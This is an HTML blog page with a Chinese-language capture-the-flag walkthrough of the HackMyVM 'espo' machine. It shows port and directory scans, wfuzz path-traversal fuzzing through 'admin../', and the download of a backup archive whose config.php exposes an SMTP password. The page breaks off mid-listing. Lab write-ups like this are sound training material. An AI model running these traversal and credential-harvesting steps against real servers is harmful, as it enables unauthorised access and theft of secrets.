@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# hmv_espo
+
+# 0.简介
+
+**靶机**：[hackmyvm - espo](https://hackmyvm.eu/machines/machine.php?vm=espo)
+**难度**：黄色
+**目标 IP**：192.168.205.236
+**本机 IP**：192.168.205.141
+
+---
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS -p- -Pn -n -T4 192.168.205.236
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
+Nmap scan report for 192.168.205.236
+Host is up (0.00024s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
+```
+
+---
+
+# 2.踩点
+
+![image](https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3)
+
+是个登录栏，搜索一下有没有什么漏洞
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ whatweb http://192.168.205.236                                     
+http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ searchsploit EspoCRM
+---------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                      |  Path
+---------------------------------------------------------------------------------------------------- ---------------------------------
+EspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt
+---------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                 
+```
+
+只有权限提升漏洞，但是我们没有用户。">
+<meta property="og:title" content="hmv_espo">
+<meta property="og:description" content="# hmv_espo
+
+# 0.简介
+
+**靶机**：[hackmyvm - espo](https://hackmyvm.eu/machines/machine.php?vm=espo)
+**难度**：黄色
+**目标 IP**：192.168.205.236
+**本机 IP**：192.168.205.141
+
+---
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS -p- -Pn -n -T4 192.168.205.236
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
+Nmap scan report for 192.168.205.236
+Host is up (0.00024s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
+```
+
+---
+
+# 2.踩点
+
+![image](https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3)
+
+是个登录栏，搜索一下有没有什么漏洞
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ whatweb http://192.168.205.236                                     
+http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ searchsploit EspoCRM
+---------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                      |  Path
+---------------------------------------------------------------------------------------------------- ---------------------------------
+EspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt
+---------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                 
+```
+
+只有权限提升漏洞，但是我们没有用户。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_espo.html">
+<meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
+<title>hmv_espo</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_espo</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/19" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>hmv_espo</h1>
+<h1>0.简介</h1>
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=espo" rel="nofollow">hackmyvm - espo</a><br>
+<strong>难度</strong>：黄色<br>
+<strong>目标 IP</strong>：192.168.205.236<br>
+<strong>本机 IP</strong>：192.168.205.141</p>
+<hr>
+<h1>1.扫描</h1>
+<p><code class="notranslate">nmap</code>起手</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS -p- -Pn -n -T4 192.168.205.236
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
+Nmap scan report <span class="pl-k">for</span> 192.168.205.236
+Host is up (0.00024s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.40 seconds                                                            </pre></div>
+<hr>
+<h1>2.踩点</h1>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3"><img src="https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3" alt="image" style="max-width: 100%;"></a></p>
+<p>是个登录栏，搜索一下有没有什么漏洞</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ whatweb http://192.168.205.236                                     
+http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ searchsploit EspoCRM
+---------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                      <span class="pl-k">|</span>  Path
+---------------------------------------------------------------------------------------------------- ---------------------------------
+EspoCRM 5.8.5 - Privilege Escalation                                                                <span class="pl-k">|</span> multiple/webapps/48376.txt
+---------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                 </pre></div>
+<p>只有权限提升漏洞，但是我们没有用户。爆破一下目录</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u http://192.168.205.236 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) <span class="pl-k">&amp;</span> Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.205.236
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,md,php,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster <span class="pl-k">in</span> directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 162] [--<span class="pl-k">&gt;</span> http://192.168.205.236/admin/]
+/install              (Status: 301) [Size: 162] [--<span class="pl-k">&gt;</span> http://192.168.205.236/install/]
+/api                  (Status: 301) [Size: 162] [--<span class="pl-k">&gt;</span> http://192.168.205.236/api/]
+/index.php            (Status: 200) [Size: 2480]
+/portal               (Status: 301) [Size: 162] [--<span class="pl-k">&gt;</span> http://192.168.205.236/portal/]
+/client               (Status: 301) [Size: 162] [--<span class="pl-k">&gt;</span> http://192.168.205.236/client/]
+/robots.txt           (Status: 200) [Size: 26]
+Progress: 42982 / 311425 (13.80%)^C
+[<span class="pl-k">!</span>] Keyboard interrupt detected, terminating.
+Progress: 44082 / 311425 (14.15%)
+===============================================================
+Finished
+===============================================================
+                                 </pre></div>
+<p>发现一点有意思的东西</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51"><img src="https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51"><img src="https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51" alt="image" style="max-width: 100%;"></a></p>
+<p>貌似可以通过绕过读取文件夹外的文件，我们爆破试试</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.236/admin../FUZZ<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="pl-s"><span class="pl-pds">'</span>s documentation for more information.</span>
+<span class="pl-s">********************************************************</span>
+<span class="pl-s">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span>
+<span class="pl-s">********************************************************</span>
+<span class="pl-s"></span>
+<span class="pl-s">Target: http://192.168.205.236/admin../FUZZ</span>
+<span class="pl-s">Total requests: 62284</span>
+<span class="pl-s"></span>
+<span class="pl-s">=====================================================================</span>
+<span class="pl-s">ID           Response   Lines    Word       Chars       Payload                                                             </span>
+<span class="pl-s">=====================================================================</span>
+<span class="pl-s"></span>
+<span class="pl-s">000000003:   301        7 L      11 W       162 Ch      "admin"                                                             </span>
+<span class="pl-s">000004255:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   </span>
+<span class="pl-s">000008002:   301        7 L      11 W       162 Ch      "_oldsite"                                                          </span>
+<span class="pl-s">000030014:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   </span>
+<span class="pl-s">000059104:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../"                                   </span>
+<span class="pl-s"></span>
+<span class="pl-s">Total time: 0</span>
+<span class="pl-s">Processed Requests: 62284</span>
+<span class="pl-s">Filtered Requests: 62279</span>
+<span class="pl-s">Requests/sec.: 0</span>
+<span class="pl-s"></span>
+<span class="pl-s">              </span></pre></div>
+<p>确实可以，我们继续爆破</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.236/admin../_oldsite/FUZZ<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="pl-s"><span class="pl-pds">'</span>s documentation for more information.</span>
+<span class="pl-s">********************************************************</span>
+<span class="pl-s">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span>
+<span class="pl-s">********************************************************</span>
+<span class="pl-s"></span>
+<span class="pl-s">Target: http://192.168.205.236/admin../_oldsite/FUZZ</span>
+<span class="pl-s">Total requests: 62284</span>
+<span class="pl-s"></span>
+<span class="pl-s">=====================================================================</span>
+<span class="pl-s">ID           Response   Lines    Word       Chars       Payload                                                             </span>
+<span class="pl-s">=====================================================================</span>
+<span class="pl-s"></span>
+<span class="pl-s">000000167:   200        11 L     79 W       540 Ch      "info"                                                              </span>
+<span class="pl-s">000004255:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          </span>
+<span class="pl-s">000030014:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          </span>
+<span class="pl-s">000059104:   403        7 L      9 W        146 Ch      "http://192.168.205.236/admin../_oldsite/"                          </span>
+<span class="pl-s"></span>
+<span class="pl-s">Total time: 34.86630</span>
+<span class="pl-s">Processed Requests: 62284</span>
+<span class="pl-s">Filtered Requests: 62280</span>
+<span class="pl-s">Requests/sec.: 1786.366</span>
+<span class="pl-s"></span>
+<span class="pl-s">                                           </span></pre></div>
+<p>有个文件，我们查看一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.236/admin../_oldsite/info
+<span class="pl-c"><span class="pl-c">#</span> Backup Configuration Settings</span>
+<span class="pl-c"><span class="pl-c">#</span> This configuration file dictates the backup protocols for critical data storage.</span>
+
+<span class="pl-c"><span class="pl-c">#</span> Directory for storing backup files</span>
+<span class="pl-c"><span class="pl-c">#</span> All backup files are stored in compressed ZIP format for efficient space usage and security.</span>
+<span class="pl-c"><span class="pl-c">#</span> Ensure that backups are regularly updated and verified for data integrity.</span>
+
+backup_directory: /admin/_oldsite
+backup_format: zip
+<span class="pl-c"><span class="pl-c">#</span> Note: The backup directory is designated for ZIP file backups only. </span>
+<span class="pl-c"><span class="pl-c">#</span> Regular maintenance and checks are required to ensure data consistency and reliability.</span>
+                                                                                            
+翻译
+<span class="pl-c"><span class="pl-c">#</span>备份配置设置</span>
+<span class="pl-c"><span class="pl-c">#</span>该配置文件规定了关键数据存储的备份协议。</span>
+<span class="pl-c"><span class="pl-c">#</span>备份文件存放目录</span>
+<span class="pl-c"><span class="pl-c">#</span>所有备份文件都以压缩ZIP格式存储，以提高空间使用效率和安全性。</span>
+确保定期更新备份并验证数据完整性。
+backup_directory:/admin/_oldsite
+backup_format:zip
+注意：指定的备份目录仅用于ZIP文件备份。
+<span class="pl-c"><span class="pl-c">#</span>需要定期维护和检查，确保数据的一致性和可靠性。</span></pre></div>
+<p>告诉了我们会保存备注文件，并且备份文件会以.zip为后缀，我们根据信息爆破一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+└─$ wfuzz -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.236/admin../_oldsite/FUZZ.zip<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="pl-s"><span class="pl-pds">'</span>s documentation for more information.</span>
+<span class="pl-s">********************************************************</span>
+<span class="pl-s">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span>
+<span class="pl-s">********************************************************</span>
+<span class="pl-s"></span>
+<span class="pl-s">Target: http://192.168.205.236/admin../_oldsite/FUZZ.zip</span>
+<span class="pl-s">Total requests: 62284</span>
+<span class="pl-s"></span>
+<span class="pl-s">=====================================================================</span>
+<span class="pl-s">ID           Response   Lines    Word       Chars       Payload                                                             </span>
+<span class="pl-s">=====================================================================</span>
+<span class="pl-s"></span>
+<span class="pl-s">000000066:   200        139379   1377104    36126245    "backup"                                                            </span>
+<span class="pl-s">                         L       W          Ch                                                                              </span>
+<span class="pl-s"></span>
+<span class="pl-s">Total time: 36.69276</span>
+<span class="pl-s">Processed Requests: 62284</span>
+<span class="pl-s">Filtered Requests: 62283</span>
+<span class="pl-s">Requests/sec.: 1697.446</span>
+<span class="pl-s"></span>
+<span class="pl-s">                             </span></pre></div>
+<p>我们把备份文件下载下来</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
+└─$ wget http://192.168.205.236/admin../_oldsite/backup.zip
+--2025-01-08 13:40:14--  http://192.168.205.236/admin../_oldsite/backup.zip
+正在连接 192.168.205.236:80... 已连接。
+已发出 HTTP 请求，正在等待回应... 200 OK
+长度：37975754 (36M) [application/zip]
+正在保存至: “backup.zip”
+
+backup.zip                        100%[<span class="pl-k">============================================================&gt;</span>]  36.22M  --.-KB/s  用时 0.08s   
+
+2025-01-08 13:40:14 (464 MB/s) - 已保存 “backup.zip” [37975754/37975754])
+
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ unzip backup.zip 
+
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls
+application  bootstrap.php    command.php  daemon.php     extension.php  install      public       vendor
+backup.zip   clear_cache.php  cron.php     data           html           LICENSE.txt  rebuild.php  web.config
+bin          client           custom       EspoCRM-7.2.4  index.php      preload.php  upgrade.php  websocket.php
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ <span class="pl-c1">cd</span> data 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/data]
+└─$ ls -la
+总计 44
+drwxrwxr-x  7 kali kali 4096 2023年12月 4日 <span class="pl-c1">.</span>
+drwxrwxr-x 12 kali kali 4096  1月 8日 13:40 ..
+drwxrwxr-x  3 kali kali 4096 2023年12月 4日 .backup
+drwxrwxr-x  3 kali kali 4096 2023年12月 4日 cache
+-rw-rw-r--  1 kali kali  972 2023年12月 4日 config-internal.php
+-rw-rw-r--  1 kali kali 5711 2023年12月 4日 config.php
+-rw-rw-r--  1 kali kali    1 2023年12月 4日 .data
+drwxr-xr-x  2 kali kali 4096 2023年12月 4日 logs
+drwxrwxr-x  2 kali kali 4096 2023年12月 4日 tmp
+drwxrwxr-x  4 kali kali 4096 2023年12月 4日 upload
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/data]
+└─$ cat config.php                                            
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>php
+<span class="pl-k">return</span> [
+  <span class="pl-s"><span class="pl-pds">'</span>useCache<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> true,
+  <span class="pl-s"><span class="pl-pds">'</span>jobMaxPortion<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 15,
+  <span class="pl-s"><span class="pl-pds">'</span>jobRunInParallel<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>jobPoolConcurrencyNumber<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 8,
+  <span class="pl-s"><span class="pl-pds">'</span>daemonMaxProcessNumber<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 5,
+  <span class="pl-s"><span class="pl-pds">'</span>daemonInterval<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 10,
+  <span class="pl-s"><span class="pl-pds">'</span>daemonProcessTimeout<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 36000,
+  <span class="pl-s"><span class="pl-pds">'</span>recordsPerPage<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 20,
+  <span class="pl-s"><span class="pl-pds">'</span>recordsPerPageSmall<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 5,
+  <span class="pl-s"><span class="pl-pds">'</span>recordsPerPageSelect<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 10,
+  <span class="pl-s"><span class="pl-pds">'</span>applicationName<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>EspoCRM<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>version<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>7.2.4<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>timeZone<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>UTC<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>dateFormat<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>DD.MM.YYYY<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>timeFormat<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>HH:mm<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>weekStart<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 0,
+  <span class="pl-s"><span class="pl-pds">'</span>thousandSeparator<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>decimalMark<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>.<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>exportDelimiter<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>currencyList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>EUR<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>defaultCurrency<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>EUR<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>baseCurrency<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>EUR<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>currencyRates<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [],
+  <span class="pl-s"><span class="pl-pds">'</span>outboundEmailIsShared<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> true,
+  <span class="pl-s"><span class="pl-pds">'</span>outboundEmailFromName<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>EspoCRM<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>outboundEmailFromAddress<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>smtpServer<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>smtpPort<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 25,
+  <span class="pl-s"><span class="pl-pds">'</span>smtpAuth<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> true,
+  <span class="pl-s"><span class="pl-pds">'</span>smtpSecurity<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>smtpUsername<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>admin<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>smtpPassword<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>39Ue4kcVJ#YpaAV24CNmbWU<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>language<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>en_US<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>authenticationMethod<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Espo<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>globalSearchEntityList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Account<span class="pl-pds">'</span></span>,
+    1 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Contact<span class="pl-pds">'</span></span>,
+    2 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Lead<span class="pl-pds">'</span></span>,
+    3 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Opportunity<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>tabList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Account<span class="pl-pds">'</span></span>,
+    1 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Contact<span class="pl-pds">'</span></span>,
+    2 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Lead<span class="pl-pds">'</span></span>,
+    3 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Opportunity<span class="pl-pds">'</span></span>,
+    4 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Case<span class="pl-pds">'</span></span>,
+    5 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Email<span class="pl-pds">'</span></span>,
+    6 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Calendar<span class="pl-pds">'</span></span>,
+    7 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Meeting<span class="pl-pds">'</span></span>,
+    8 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Call<span class="pl-pds">'</span></span>,
+    9 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Task<span class="pl-pds">'</span></span>,
+    10 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>_delimiter_<span class="pl-pds">'</span></span>,
+    11 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Document<span class="pl-pds">'</span></span>,
+    12 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Campaign<span class="pl-pds">'</span></span>,
+    13 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>KnowledgeBaseArticle<span class="pl-pds">'</span></span>,
+    14 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Stream<span class="pl-pds">'</span></span>,
+    15 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>User<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>quickCreateList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Account<span class="pl-pds">'</span></span>,
